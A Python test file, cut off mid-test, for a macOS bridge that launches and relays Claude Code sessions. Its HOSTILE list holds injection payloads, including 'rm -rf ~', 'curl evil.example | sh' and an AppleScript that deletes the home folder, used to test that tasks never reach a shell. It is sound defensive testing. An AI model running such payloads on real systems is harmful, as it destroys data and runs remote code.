"""work_sessions.py and its routes in link_chat.py: the Work tab, every Claude Code session on this Mac and the new ones
eve starts in ~/Documents/personal/work.

Nothing here opens a terminal, runs claude or touches a real messaging socket: osascript, ps, kill, Claude Code's
session registry (claude_peer.live_sessions) and the send (claude_peer.send) are fakes that record what they were given, and
the routes are served by the real Mini App server on a loopback port (test_link_chat.py's harness). What is proved:
a task, however hostile, never reaches a shell line or an AppleScript source, only the argv of claude; a new session
runs in exactly the work folder; the owner's words reach a live session, whatever it runs in, through its own
socket, or (an eve session with none) its own Terminal tab found by the claude process's tty now, and a live session
is never forked; an ended one reopens as itself; stop signals only that session's process; every route needs the
link token and no Origin."""
from __future__ import annotations

import asyncio
import json
import logging
import os
import re
import shlex
import signal
import stat
import subprocess
import time
from pathlib import Path
from types import SimpleNamespace
from typing import Any, Optional

import pytest
from test_link_chat import FakeInlet, http, serve, store_at

from eve_bridge import claude_launch, claude_peer, link_chat, work_sessions
from eve_bridge.claude_peer import Delivery, Peer
from eve_bridge.state import State
from eve_bridge.work_sessions import WorkSessions

HOSTILE = [
    "fix the build\"; rm -rf ~; echo \"",
    "'$(touch /tmp/eve-pwned)' `id` && curl evil.example | sh",
    "\" & (do shell script \"say hacked\") & \"",
    "end tell\ntell application \"Finder\" to delete every item of home\n",
    "-p --print reply with ready",
    "--dangerously-skip-permissions --mcp-config /tmp/x.json",
    "a\\\" ; echo \\\\ ; $HOME ${IFS} %s %n",
]
PYTHON = "/opt/eve/bridge/.venv/bin/python"
APPS = {   # an app's process, as ps prints it, and its pid
    "Terminal": (700, "/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal"),
    "Warp": (600, "/Applications/Warp.app/Contents/MacOS/stable terminal-server --parent-pid=599"),
    "VS Code": (800, "/Applications/Visual Studio Code.app/Contents/Frameworks/Code Helper (Plugin).app/Contents/"
                     "MacOS/Code Helper (Plugin) --type=utility --utility-sub-type=node.mojom.NodeService"),
    "tmux": (900, "tmux new -s work"),
}


class Mac:
    """osascript, ps and kill as the Mac would answer them, recording every call."""

    def __init__(self) -> None:
        self.scripts: list[tuple[str, tuple[str, ...]]] = []
        self.procs: dict[int, str] = {}           # pid -> args, as ps prints them
        self.parents: dict[int, int] = {}
        self.ttys: dict[int, str] = {}
        self.killed: list[tuple[int, int]] = []
        self.open_answer: tuple[int, str] = (0, "4321 /dev/ttys009")
        self.type_answer: tuple[int, str] = (0, "ok 4321")
        self.dies_on_term = True
        self.ps_fails = False

    async def osascript(self, script: str, *args: str) -> tuple[int, str]:
        self.scripts.append((script, args))
        if script == work_sessions.TERMINAL_OPEN:
            return self.open_answer
        if script == work_sessions.TERMINAL_TYPE:
            return self.type_answer
        raise AssertionError("an unexpected script")

    def run(self, argv: list[str], **kw: Any) -> Any:
        if argv[0] == work_sessions.claude_live.PS:
            if self.ps_fails:
                raise subprocess.TimeoutExpired(argv, 1.5)
            assert argv[-1] == "pid=,ppid=,tty=,args="
            rows = [f"{1:>6} {0:>6} ??       /sbin/launchd"]
            rows += [f"{pid:>6} {self.parents.get(pid, 1):>6} {self.ttys.get(pid, '??'):<8} {args}"
                     for pid, args in self.procs.items()]
            return SimpleNamespace(returncode=0, stdout="\n".join(rows))
        raise AssertionError(f"an unexpected command {argv[0]}")

    def kill(self, pid: int, sig: int) -> None:
        self.killed.append((pid, sig))
        if sig == signal.SIGKILL or self.dies_on_term:
            self.procs.pop(pid, None)

    def claude(self, pid: int, sid: str, task: str = "a task", *, resume: bool = False, app: str = "Terminal",
               tty: str = "ttys009") -> None:
        """A claude process for session ``sid`` in ``app``: the app, a shell in it, and claude on ``tty``."""
        app_pid, app_args = APPS[app]
        self.procs[app_pid] = app_args
        self.procs[pid + 10000] = "login -pf owner" if app == "Terminal" else "-zsh"
        self.parents[pid + 10000] = app_pid
        self.procs[pid] = " ".join(work_sessions.launch_argv(sid, task, Path("/x/m.json"), "/usr/local/bin/claude",
                                                             resume=resume))
        self.parents[pid] = pid + 10000
        self.ttys[pid] = tty

    def plain_claude(self, pid: int, *, app: str = "Warp", tty: str = "ttys002") -> None:
        """The owner's own session, started by hand: no session id on its command line."""
        self.claude(pid, "00000000-0000-4000-8000-000000000000", app=app, tty=tty)
        self.procs[pid] = "claude --dangerously-skip-permissions"


class Registry:
    """Claude Code's session registry (claude_peer.live_sessions) and the send into one session's socket (claude_peer.send)."""

    def __init__(self) -> None:
        self.peers: Optional[dict[str, Peer]] = {}
        self.fails = False
        self.sent: list[tuple[str, str]] = []
        self.answer: dict[str, Delivery] = {}       # session id -> what its send answers; delivered otherwise
        self.delay: dict[str, float] = {}           # text -> seconds the send takes

    def read(self) -> Optional[dict[str, Peer]]:
        if self.fails:
            raise OSError("the registry folder is unreadable")
        return None if self.peers is None else dict(self.peers)

    async def send(self, peer: Peer, text: str) -> Delivery:
        await asyncio.sleep(self.delay.get(text, 0))
        self.sent.append((peer.session_id, text))
        return self.answer.get(peer.session_id, Delivery("delivered"))

    def add(self, sid: str, pid: int, *, status: str = "idle", name: str = "proj-a1", cwd: str = "/code/proj",
            socket: bool = True) -> Peer:
        got = Peer(pid=pid, session_id=sid, cwd=cwd, name=name, status=status, kind="interactive",
                   socket_path=f"/tmp/cc-socks/{pid}.sock" if socket else "", version="2.1.311",
                   protocol=1 if socket else 0, features=("notify_idle", "reply_across_default_dirs"))
        assert self.peers is not None
        self.peers[sid] = got
        return got


def make(tmp_path: Path, mac: Optional[Mac] = None, state: Any = None, reg: Optional[Registry] = None,
         **kw: Any) -> tuple[WorkSessions, Mac]:
    mac = mac or Mac()
    reg = reg or Registry()
    clock = kw.pop("clock", time.time)

    async def no_sleep(_s: float) -> None:
        await asyncio.sleep(0)

    work = WorkSessions(root=tmp_path / "personal" / "work", home=tmp_path / "home", state=lambda: state,
                        osascript=mac.osascript, run=mac.run, kill=mac.kill, live=kw.pop("live", lambda: None),
                        peers=reg.read, send=reg.send, clock=clock, python=PYTHON, sleep=no_sleep, environ={},
                        claude_dir=tmp_path / "claude", **kw)
    return work, mac


def start(work: WorkSessions, task: str, client_id: str = "") -> tuple[int, dict[str, Any]]:
    return asyncio.run(work.start(task, client_id))


def launched(tmp_path: Path, sid: str, verb: str = "launch") -> list[str]:
    ran: list[tuple[str, list[str]]] = []
    import shutil as _shutil
    old = _shutil.which
    try:
        _shutil.which = lambda name: "/usr/local/bin/claude" if name == "claude" else None   # type: ignore[assignment]
        assert work_sessions.main([verb, sid], home=tmp_path / "home",
                                  execvp=lambda f, a: ran.append((f, a))) == 0
    finally:
        _shutil.which = old                                         # type: ignore[assignment]
    [(_, argv)] = ran
    return argv


def opened(mac: Mac) -> list[tuple[str, ...]]:
    return [args for script, args in mac.scripts if script == work_sessions.TERMINAL_OPEN]


def typed(mac: Mac) -> list[tuple[str, ...]]:
    return [args for script, args in mac.scripts if script == work_sessions.TERMINAL_TYPE]


# ---- start: the task never reaches a shell or a script ----------------------------------------------------------

@pytest.mark.parametrize("task", HOSTILE)
def test_a_task_is_never_in_a_shell_line_or_a_script_only_claudes_argv(tmp_path: Path, task: str) -> None:
    work, mac = make(tmp_path)
    status, out = start(work, task)
    assert status == 200 and out["ok"] is True
    sid = out["session"]["id"]
    assert re.fullmatch(work_sessions.UUID_RE.pattern[1:-1], sid)
    [(script, args)] = mac.scripts
    assert script == work_sessions.TERMINAL_OPEN                     # a fixed source, the line is its argument
    [line] = args
    root = tmp_path / "personal" / "work"
    assert line == f"cd {shlex.quote(str(root))} && exec {shlex.quote(PYTHON)} -P -m eve_bridge.work_sessions launch {sid}"
    for word in task.split():
        if len(word) > 3:
            assert word not in line, word
    # the task waits in a 0600 file, and only main() reads it, into one argv element after "--"
    task_file = tmp_path / "home" / "work" / f"{sid}.task"
    assert task_file.read_text() == task.strip()
    assert stat.S_IMODE(task_file.stat().st_mode) == 0o600
    assert stat.S_IMODE(task_file.parent.stat().st_mode) == 0o700
    mcp = tmp_path / "home" / "work" / f"{sid}.mcp.json"
    assert launched(tmp_path, sid) == ["/usr/local/bin/claude", "--dangerously-skip-permissions", "--mcp-config",
                                       str(mcp), "--session-id", sid, "--", task.strip()]
    assert not task_file.exists()                                  # read once, then gone


def test_the_session_runs_in_personal_work_never_the_work_area(tmp_path: Path,
                                                               monkeypatch: pytest.MonkeyPatch) -> None:
    home = Path.home()
    assert work_sessions.work_root({}) == home / "Documents" / "personal" / "work"
    assert work_sessions.work_root({}) != claude_launch.code_root({}) / "work"
    assert work_sessions.work_root({"EVE_WORK_ROOT": str(tmp_path)}) == tmp_path
    work, mac = make(tmp_path)
    start(work, "hello")
    line = mac.scripts[0][1][0]
    assert line.startswith(f"cd {shlex.quote(str(tmp_path / 'personal' / 'work'))} && ")
    assert "era-code" not in line and "claude" not in line.split("&&")[0]
    assert (tmp_path / "personal" / "work").is_dir()


def test_eves_mcp_config_is_private_and_holds_only_a_token_hash_in_the_registry(tmp_path: Path) -> None:
    work, _ = make(tmp_path)
    sid = start(work, "hello")[1]["session"]["id"]
    mcp = tmp_path / "home" / "work" / f"{sid}.mcp.json"
    assert stat.S_IMODE(mcp.stat().st_mode) == 0o600
    server = json.loads(mcp.read_text())["mcpServers"]["eve"]
    assert server["command"] == PYTHON and server["args"] == ["-P", "-m", "eve_bridge.eve_mcp"]
    token = server["env"]["EVE_MCP_TOKEN"]
    assert server["env"]["EVE_MCP_SESSION"] == sid and len(token) >= 40
    registry = (tmp_path / "home" / work_sessions.REGISTRY_NAME).read_text()
    assert token not in registry and sid in registry
    assert stat.S_IMODE((tmp_path / "home" / work_sessions.REGISTRY_NAME).stat().st_mode) == 0o600
    assert work.check_token(sid, token) and not work.check_token(sid, token[:-1])
    assert not work.check_token("nope", token) and not work.check_token(sid, None)
    again = WorkSessions(root=tmp_path / "w", home=tmp_path / "home", osascript=_never, environ={})
    assert again.check_token(sid, token)                            # the registry survives a restart


async def _never(*_a: Any) -> tuple[int, str]:
    raise AssertionError("no terminal")


def test_the_same_client_id_is_one_session_and_one_terminal(tmp_path: Path) -> None:
    work, mac = make(tmp_path)
    a = start(work, "hello", "c-1")[1]["session"]["id"]
    b = start(work, "hello again", "c-1")[1]["session"]["id"]
    c = start(work, "hello", "c-2")[1]["session"]["id"]
    assert a == b != c
    assert len(mac.scripts) == 2


@pytest.mark.parametrize("task,client_id", [("", ""), ("   ", ""), (None, ""), (42, ""), ("x" * 4001, ""),
                                            ("ok", "c" * 65), ("ok", 7)])
def test_a_bad_start_is_a_400_and_opens_nothing(tmp_path: Path, task: Any, client_id: Any) -> None:
    work, mac = make(tmp_path)
    status, out = start(work, task, client_id)
    assert status == 400 and out["ok"] is False and mac.scripts == []


def test_terminal_failing_is_a_503_and_leaves_nothing_behind(tmp_path: Path) -> None:
    work, mac = make(tmp_path)
    mac.open_answer = (1, "Not authorized to send Apple events to Terminal.")
    status, out = start(work, "hello")
    assert status == 503 and out == {"ok": False, "reason": "eve couldn't open Terminal on the Mac"}
    assert work.records == {}
    assert list((tmp_path / "home" / "work").iterdir()) == []


def test_a_window_whose_id_terminal_did_not_give_still_takes_replies_by_its_tty(tmp_path: Path) -> None:
    """TERMINAL_OPEN's window id is a guess when Terminal does not say (2026-10-26: it named the front window, which
    was another one). The typing script looks in every window for the busy tab on the claude process's tty."""
    now = {"t": 1000.0}
    work, mac = make(tmp_path, clock=lambda: now["t"])
    mac.open_answer = (0, "0 ")
    status, out = start(work, "hello")
    assert status == 200 and out["session"]["can_reply"] is True and out["session"]["where"] == "Terminal"
    sid = out["session"]["id"]
    mac.claude(8, sid, tty="ttys004")
    now["t"] += work_sessions.GRACE_SECS + 1
    assert asyncio.run(work.reply(sid, "hi")) == (200, {"ok": True, "delivered": "typed"})
    assert typed(mac) == [("0", "/dev/ttys004", "hi")]                  # no window known: every window is searched
    assert work.records[sid].window_id == 4321                          # where the tab really was, kept for next time


def test_session_end_is_not_the_end_while_the_process_runs(tmp_path: Path) -> None:
    now = {"t": 1000.0}
    work, mac = make(tmp_path, clock=lambda: now["t"])
    sid = start(work, "hello")[1]["session"]["id"]
    mac.claude(8, sid)
    work.note("session_end", {"session_id": sid})                     # a /clear
    now["t"] += work_sessions.GRACE_SECS + 1
    assert [r["id"] for r in asyncio.run(work.list())[1]["sessions"]] == [sid]
    assert asyncio.run(work.reply(sid, "hi"))[0] == 200


# ---- the list ----------------------------------------------------------------------------------------------------

ROW_KEYS = {"id", "folder", "title", "state", "where", "last_activity", "last_line", "from_work", "can_reply",
            "can_stop", "can_continue"}


def test_states_follow_the_hooks_and_the_list_has_every_live_session(tmp_path: Path) -> None:
    state = State()
    work, mac = make(tmp_path, state=state)
    sid = start(work, "Port the parser to Rust\nand keep the tests")[1]["session"]["id"]
    rows = asyncio.run(work.list())[1]["sessions"]
    assert [(r["id"], r["state"], r["title"], r["folder"]) for r in rows] == [
        (sid, "starting", "Port the parser to Rust", "work")]
    mac.claude(501, sid)
    for evt, req, want in (("session_start", {}, "idle"), ("turn_begin", {}, "working"),
                           ("notification", {"notification_type": "idle_prompt"}, "working"),
                           ("pretooluse", {"tool_name": "AskUserQuestion"}, "waiting"),
                           ("posttooluse", {}, "working"),
                           ("notification", {"notification_type": "permission_prompt"}, "waiting"),
                           ("turn_begin", {}, "working"), ("turn_end", {}, "idle")):
        work.note(evt, {"session_id": sid, **req})
        assert asyncio.run(work.list())[1]["sessions"][0]["state"] == want, evt
    # another session the hooks told the daemon about, with no messaging socket: listed, read-only
    state.session_start("11111111-2222-4333-8444-555555555555", cwd=str(tmp_path / "eve"))
    state.turn_begin("11111111-2222-4333-8444-555555555555")
    out = asyncio.run(work.list())[1]
    other = next(r for r in out["sessions"] if not r["from_work"])
    assert other["folder"] == "eve" and other["state"] == "working" and not other["can_reply"] and not other["can_stop"]
    mine = next(r for r in out["sessions"] if r["from_work"])
    assert mine["can_reply"] and mine["can_stop"] and mine["where"] == "Terminal"
    assert set(mine) == ROW_KEYS and set(other) == ROW_KEYS
    assert mine["can_continue"] is False and other["can_continue"] is False      # live: never "continue"
    assert all("/" not in r["folder"] for r in out["sessions"])     # basenames only
    assert out["folder"] == "work"


def test_a_session_whose_process_is_gone_leaves_the_list(tmp_path: Path) -> None:
    now = {"t": 1000.0}
    work, mac = make(tmp_path, clock=lambda: now["t"])
    sid = start(work, "hello")[1]["session"]["id"]
    assert [r["id"] for r in asyncio.run(work.list())[1]["sessions"]] == [sid]     # within its grace
    now["t"] += work_sessions.GRACE_SECS + 1
    assert asyncio.run(work.list())[1]["sessions"] == []
    assert work.records[sid].over
    mac.ps_fails = True                                             # a blind probe keeps what it cannot judge
    sid2 = start(work, "again")[1]["session"]["id"]
    now["t"] += work_sessions.GRACE_SECS + 1
    assert [r["id"] for r in asyncio.run(work.list())[1]["sessions"]] == [sid2]


def test_every_live_session_in_claude_codes_registry_is_listed_with_where_it_runs(tmp_path: Path) -> None:
    """Owner, 2026-10-26: "talk to current terminal sessions through the work area". A session in Warp, in VS Code
    or in tmux that the daemon's hooks never told it about (a restart, an idle session) is listed from Claude Code's
    own registry, and can be replied to."""
    reg = Registry()
    work, mac = make(tmp_path, reg=reg)
    warp, code, tmux, bare = (f"{n}1111111-2222-4333-8444-555555555555" for n in "abcd")
    mac.plain_claude(81, app="Warp")
    reg.add(warp, 81, status="busy", name="proj-warp", cwd=str(tmp_path / "code" / "proj"))
    mac.plain_claude(82, app="VS Code")
    reg.add(code, 82, cwd=str(tmp_path / "code" / "site"))
    mac.procs[82] = ("/home/o/.vscode/extensions/anthropic.claude-code/resources/native-binary/claude "
                     "--output-format stream-json --verbose --input-format stream-json")    # an IDE's: the SDK's way
    mac.plain_claude(83, app="tmux")
    reg.add(tmux, 83, cwd=str(tmp_path / "code" / "notes"))
    mac.procs[84] = "claude"                                         # started by launchd: nothing says where
    reg.add(bare, 84, cwd=str(tmp_path / "code" / "misc"))
    # a hook's one-shot drafter registers like a session (seen live 2026-10-26), but nobody talks to it
    drafter = "e1111111-2222-4333-8444-555555555555"
    mac.procs[85] = "claude -p You are the debrief drafter. Write one file, then stop"
    reg.add(drafter, 85, status="busy", name="notes-bd", cwd=str(tmp_path / "notes"))
    rows = {r["id"]: r for r in asyncio.run(work.list())[1]["sessions"]}
    assert set(rows) == {warp, code, tmux, bare}
    assert [rows[s]["where"] for s in (warp, code, tmux, bare)] == ["Warp", "VS Code", "tmux", ""]
    assert rows[warp]["state"] == "working" and rows[code]["state"] == "idle"
    assert rows[warp]["title"] == "proj-warp" and rows[warp]["folder"] == "proj"
    for row in rows.values():
        assert set(row) == ROW_KEYS
        assert row["can_reply"] is True and row["can_stop"] is False and row["can_continue"] is False
        assert row["from_work"] is False


def test_a_registry_that_cannot_be_read_is_a_blind_look_never_a_crash(tmp_path: Path) -> None:
    reg = Registry()
    work, mac = make(tmp_path, reg=reg)
    sid = start(work, "hello")[1]["session"]["id"]
    mac.claude(9, sid)
    reg.fails = True
    status, out = asyncio.run(work.list())
    assert status == 200 and [r["id"] for r in out["sessions"]] == [sid]
    reg.fails = False
    reg.peers = None                                                 # "cannot tell" from claude_peer itself
    assert [r["id"] for r in asyncio.run(work.list())[1]["sessions"]] == [sid]


# ---- detail ------------------------------------------------------------------------------------------------------

def transcript(path: Path, rows: list[dict[str, Any]]) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("\n".join(json.dumps(r) for r in rows) + "\n")
    return path


def line(kind: str, content: Any, **kw: Any) -> dict[str, Any]:
    return {"type": kind, "timestamp": "2026-10-12T10:00:00.000Z",
            "message": {"role": "user" if kind == "user" else "assistant", "content": content}, **kw}


def test_detail_is_the_latest_turns_only_words_clipped_and_without_secrets(tmp_path: Path) -> None:
    state = State()
    work, mac = make(tmp_path, state=state)
    sid = start(work, "hello")[1]["session"]["id"]
    mac.claude(77, sid)
    path = transcript(tmp_path / "t" / f"{sid}.jsonl", [
        line("user", "Find the flaky test"),
        line("user", "<command-name>/clear</command-name>"),
        line("user", "Caveat: meta", isMeta=True),
        line("assistant", [{"type": "thinking", "thinking": "private thoughts"},
                           {"type": "text", "text": "Looking now."},
                           {"type": "tool_use", "id": "t1", "name": "Bash", "input": {"command": "cat .env"}}]),
        line("user", [{"type": "tool_result", "tool_use_id": "t1", "content": "OPENROUTER_API_KEY=abc123"}]),
        line("assistant", [{"type": "text", "text": "Subagent says hi"}], isSidechain=True),
        line("assistant", [{"type": "text", "text": "Found it. Key sk-or-v1-" + "a" * 40 + " and API_TOKEN=hunter2 "
                                                    "and ghp_" + "b" * 36 + " " + "y" * 3000}]),
    ])
    work.note("session_start", {"session_id": sid, "transcript_path": str(path)})
    status, out = asyncio.run(work.detail(sid))
    assert status == 200
    assert [(t["role"], t["text"][:20]) for t in out["turns"]] == [
        ("owner", "Find the flaky test"), ("claude", "Looking now."), ("claude", "Found it. Key [hidde")]
    last = out["turns"][-1]["text"]
    assert len(last) <= work_sessions.TURN_CHARS and last.endswith("…")
    for secret in ("sk-or-v1-", "hunter2", "ghp_", "abc123", "private thoughts", "cat .env", "Subagent"):
        assert secret not in json.dumps(out), secret
    assert out["turns"][0]["at"] > 0 and out["cut"] is False
    assert out["session"]["id"] == sid and out["session"]["last_line"].startswith("Found it.")
    assert asyncio.run(work.detail("99999999-2222-4333-8444-555555555555"))[0] == 404


def test_detail_ends_a_session_whose_claude_exited_and_says_ended(tmp_path: Path) -> None:
    """/exit or a crash while the sheet is open (the list is not polled then): detail itself notices after the
    grace, ends the record and answers state "ended"; within the grace it is "starting"."""
    now = {"t": 1000.0}
    work, mac = make(tmp_path, clock=lambda: now["t"])
    sid = start(work, "hello")[1]["session"]["id"]
    status, out = asyncio.run(work.detail(sid))
    assert status == 200 and out["session"]["state"] == "starting" and out["ended"] is False   # within its grace
    mac.claude(9, sid)
    work.note("session_start", {"session_id": sid})
    now["t"] += work_sessions.GRACE_SECS + 1
    out = asyncio.run(work.detail(sid))[1]
    assert out["session"]["state"] == "idle" and out["session"]["can_reply"] and out["ended"] is False
    del mac.procs[9]                                                 # the owner typed /exit
    out = asyncio.run(work.detail(sid))[1]
    assert out["ended"] is True and out["session"]["state"] == "ended"
    assert out["session"]["can_reply"] is False and out["session"]["can_stop"] is False
    assert work.records[sid].over
    mac.ps_fails = True                                              # a blind probe never ends a session
    sid2 = start(work, "again")[1]["session"]["id"]
    now["t"] += work_sessions.GRACE_SECS + 1
    out = asyncio.run(work.detail(sid2))[1]
    assert out["ended"] is False and not work.records[sid2].over
    # a stopped session reads as ended too
    mac.ps_fails = False
    assert asyncio.run(work.stop(sid2))[0] == 200
    out = asyncio.run(work.detail(sid2))[1]
    assert out["ended"] is True and out["session"]["state"] == "ended"


def test_a_session_past_its_grace_without_a_process_is_never_starting(tmp_path: Path) -> None:
    now = {"t": 1000.0}
    work, _ = make(tmp_path, clock=lambda: now["t"])
    sid = start(work, "hello")[1]["session"]["id"]
    rec = work.records[sid]
    rec.phase = "working"
    seen = work_sessions.Seen({1: work_sessions.Proc(0, "", "/sbin/launchd")}, {})
    assert work._row(sid, seen, True, rec=rec, line="")["state"] == "starting"
    now["t"] += work_sessions.GRACE_SECS + 1
    assert work._row(sid, seen, None, rec=rec, line="")["state"] == "working"
    assert work._row(sid, seen, None, rec=rec, line="")["can_reply"] is False
    # claude is up (ps and the registry name it) but no SessionStart hook came: never "starting" for good
    rec.phase = "starting"
    peer = Peer(pid=42, session_id=sid, cwd="", name="", status="busy", kind="interactive",
                socket_path="/tmp/cc-socks/42.sock", version="2.1.311", protocol=1)
    seen = work_sessions.Seen({1: work_sessions.Proc(0, "", "/sbin/launchd"),
                               42: work_sessions.Proc(1, "/dev/ttys009", f"claude --session-id {sid}")}, {sid: peer})
    assert work._row(sid, seen, True, rec=rec, line="")["state"] == "working"


def test_the_mcp_server_never_has_the_work_folder_on_sys_path() -> None:
    got = work_sessions.mcp_config("11111111-2222-4333-8444-555555555555", "tok", PYTHON, {})
    assert got["mcpServers"]["eve"]["args"] == ["-P", "-m", "eve_bridge.eve_mcp"]


def test_minus_p_keeps_a_planted_stdlib_name_in_the_work_folder_from_loading(tmp_path: Path) -> None:
    import sys as _sys
    (tmp_path / "uuid.py").write_text("raise SystemExit('planted uuid.py ran')\n")
    planted = subprocess.run([_sys.executable, "-m", "uuid"], cwd=tmp_path, capture_output=True, text=True)
    assert "planted uuid.py ran" in planted.stderr                   # without -P the folder's file wins
    guarded = subprocess.run([_sys.executable, "-P", "-m", "uuid"], cwd=tmp_path, capture_output=True, text=True)
    assert "planted" not in guarded.stderr and guarded.returncode == 0


def test_detail_keeps_the_last_twenty_turns_of_a_long_transcript(tmp_path: Path) -> None:
    path = transcript(tmp_path / "t.jsonl", [line("user" if i % 2 else "assistant",
                                                  f"turn {i}" if i % 2 else [{"type": "text", "text": f"turn {i}"}])
                                             for i in range(60)])
    turns, cut = work_sessions.transcript_turns(path)
    assert [t["text"] for t in turns] == [f"turn {i}" for i in range(40, 60)] and cut is True
    turns, cut = work_sessions.transcript_turns(path, tail=200, grow_to=200)    # a tail that starts mid-line
    assert cut is True and all(t["text"].startswith("turn ") for t in turns)


def test_a_prompt_behind_a_big_turn_is_found_by_growing_the_tail(tmp_path: Path) -> None:
    """A turn's attachments and tool results can fill the first tail: it grows until it has the turns it shows."""
    big = [line("user", [{"type": "tool_result", "tool_use_id": f"t{i}", "content": "x" * 50_000}]) for i in range(30)]
    path = transcript(tmp_path / "t.jsonl", [line("user", "Port the hooks"), *big,
                                             line("assistant", [{"type": "text", "text": "Ported."}])])
    turns, _ = work_sessions.transcript_turns(path, tail=64 * 1024)
    assert [(t["role"], t["text"]) for t in turns] == [("owner", "Port the hooks"), ("claude", "Ported.")]
    turns, _ = work_sessions.transcript_turns(path, tail=64 * 1024, grow_to=64 * 1024)   # positive control
    assert ("owner", "Port the hooks") not in [(t["role"], t["text"]) for t in turns]


def test_a_prompt_typed_while_claude_worked_is_the_owners_turn(tmp_path: Path) -> None:
    path = transcript(tmp_path / "t.jsonl", [
        line("user", "Start the port"),
        {"type": "attachment", "timestamp": "2026-10-26T10:00:00Z",
         "attachment": {"type": "queued_command", "prompt": "and keep the tests", "commandMode": "prompt"}},
        {"type": "attachment", "attachment": {"type": "queued_command", "prompt": "/compact", "commandMode": "bash"}},
        line("assistant", [{"type": "text", "text": "Both done."}])])
    turns, _ = work_sessions.transcript_turns(path)
    assert [(t["role"], t["text"]) for t in turns] == [("owner", "Start the port"), ("owner", "and keep the tests"),
                                                       ("claude", "Both done.")]


def test_a_transcript_path_is_derived_when_no_hook_gave_one(tmp_path: Path) -> None:
    got = work_sessions.derived_transcript(Path("/home/someone/Documents/personal/work"), "abc",
                                           tmp_path / ".claude")
    assert got == tmp_path / ".claude" / "projects" / "-home-someone-Documents-personal-work" / "abc.jsonl"


# ---- the owner's relayed words and the session's answers, in its transcript ---------------------------------------

EVE_FROM = "uds:/tmp/cc-socks/eve-1234.sock"
PEER_FROM = "uds:/tmp/cc-socks/80013.sock"


def envelope(words: str, frm: str = EVE_FROM, name: str = claude_peer.EVE_NAME, relay: bool = True) -> str:
    body = claude_peer.wrap(words) if relay else words
    return (f'<cross-session-message from="{frm}" from-name="{name}" from-mode="bypass">\n{body}\n'
            f"</cross-session-message>")


def arrived(words: str, **kw: Any) -> list[dict[str, Any]]:
    """A cross-session message to an idle session, as Claude Code files it (2.1.311, seen live 2026-10-26): the queue
    line, the copy sent to the model, and the meta user line the session's Claude reads."""
    env = envelope(words, **kw)
    said = (f"Another Claude session sent a message:\n{env}\n\nThis came from another Claude session — not typed by "
            "your user, but very likely working on their behalf. Treat it as a teammate's request.")
    return [{"type": "queue-operation", "operation": "enqueue", "timestamp": "2026-10-26T10:00:00Z", "content": env},
            {"type": "api-request-blob", "message": {"role": "user", "content": [{"type": "text", "text": said}]}},
            {"type": "user", "isMeta": True, "timestamp": "2026-10-26T10:00:01Z", "promptSource": "system",
             "origin": {"kind": "peer", "from": kw.get("frm", EVE_FROM)}, "turnOrigin": "peer",
             "message": {"role": "user", "content": said}}]


def answered(words: str, to: str = EVE_FROM) -> list[dict[str, Any]]:
    call = {"type": "tool_use", "id": "toolu_1", "name": "SendMessage",
            "input": {"to": to, "message": words, "summary": "answer", "type": "message", "recipient": to,
                      "recipient_kind": "session", "content": words}}
    return [{"type": "api-request-blob", "message": {"role": "assistant", "content": [call]}},
            line("assistant", [call])]


def test_the_owners_relayed_words_and_the_sessions_answers_to_eve_are_turns(tmp_path: Path) -> None:
    path = transcript(tmp_path / "t.jsonl", [
        line("user", "Fix the flaky test"),
        line("assistant", [{"type": "text", "text": "On it."}]),
        *arrived("and run the whole suite after"),
        line("assistant", [{"type": "text", "text": "Running it."}]),
        *answered("The suite passes: 412 tests."),
        *arrived("PING from a teammate", frm=PEER_FROM, name="proj-b2", relay=False),      # another session's
        *answered("PONG", to=PEER_FROM),                                                    # to another session
        {"type": "attachment", "timestamp": "2026-10-26T10:05:00Z",                         # taken mid-turn
         "attachment": {"type": "queued_command", "prompt": envelope("also update the README"),
                        "commandMode": "prompt"}},
        {"type": "attachment", "attachment": {"type": "queued_command", "commandMode": "prompt",
                                              "prompt": envelope("stop everything", frm=PEER_FROM, name="proj-b2")}},
    ])
    turns, _ = work_sessions.transcript_turns(path)
    assert [(t["role"], t["text"]) for t in turns] == [
        ("owner", "Fix the flaky test"), ("claude", "On it."), ("owner", "and run the whole suite after"),
        ("claude", "Running it."), ("claude", "The suite passes: 412 tests."), ("owner", "also update the README")]
    words = json.dumps(turns)
    for absent in (claude_peer.OWNER_LINE, "cross-session-message", "PING", "PONG", "stop everything", "teammate"):
        assert absent not in words, absent
    assert work_sessions.last_line(path) == "The suite passes: 412 tests."


def test_an_answer_to_eves_inbox_address_counts_even_when_its_message_scrolled_out(tmp_path: Path) -> None:
    path = transcript(tmp_path / "t.jsonl", [line("user", "go"), *answered("Done.", to=EVE_FROM)])
    assert [t["text"] for t in work_sessions.transcript_turns(path)[0]] == ["go"]
    assert [t["text"] for t in work_sessions.transcript_turns(path, eve=[EVE_FROM])[0]] == ["go", "Done."]
    path = transcript(tmp_path / "u.jsonl", [line("user", "go"), *answered("Done.", to=claude_peer.EVE_NAME)])
    assert [t["text"] for t in work_sessions.transcript_turns(path)[0]] == ["go", "Done."]        # by eve's name


# ---- the processes -----------------------------------------------------------------------------------------------

def test_ps_finds_session_ids_only_before_the_task(tmp_path: Path) -> None:
    sid = "0f0e0d0c-0b0a-4908-8706-050403020100"
    other = "11111111-2222-4333-8444-555555555555"
    third = "22222222-2222-4333-8444-555555555555"
    mac = Mac()
    mac.claude(5, sid, task=f"--session-id {other} --resume {third}")    # a task that names other ids
    mac.procs[6] = f"node /opt/homebrew/bin/claude --session-id={other}"
    mac.procs[7] = f"vim --session-id {sid}"                    # not claude
    mac.procs[8] = f"/usr/local/bin/claude --dangerously-skip-permissions --mcp-config /x --resume {third} -- hi"
    # a SessionEnd hook's headless drafter, whose prompt (before any "--") names a session
    mac.procs[9] = f"claude -p You are the drafter. Read --session-id {sid} and --resume {other} then stop"
    assert work_sessions.session_pids(mac.run) == {sid: 5, other: 6, third: 8}
    fourth = "33333333-2222-4333-8444-555555555555"
    mac.claude(10, fourth, task="mkdir -p src, then git log -p --print --output-format json")   # a task, not flags
    assert work_sessions.session_pids(mac.run) == {sid: 5, other: 6, third: 8, fourth: 10}


def test_a_task_that_reads_like_a_headless_flag_is_still_a_live_session_stop_reaches(tmp_path: Path) -> None:
    """Found in review, 2026-10-26: the headless check read the whole command line, the task after ``--`` too, so a
    task like "mkdir -p src" hid its own session from ps: the list ended it while it ran, and stop signalled nothing."""
    now = {"t": 1000.0}
    work, mac = make(tmp_path, clock=lambda: now["t"])
    task = "mkdir -p src, then show me git log -p for the parser"
    sid = start(work, task)[1]["session"]["id"]
